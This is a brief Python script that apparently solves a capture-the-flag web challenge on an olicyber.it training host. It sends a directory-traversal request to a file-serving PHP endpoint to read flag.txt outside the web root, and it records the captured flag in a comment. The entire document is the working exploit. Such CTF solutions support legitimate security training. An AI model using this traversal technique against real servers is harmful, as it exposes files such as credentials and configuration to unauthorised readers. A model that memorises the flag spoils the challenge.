import requests

site = "http://gallery.challs.olicyber.it"

r = requests.get(f"{site}/serve_file.php?path=../../../../flag.txt").text
print(r)

#flag{suf1ng_th3_fil3syst3m}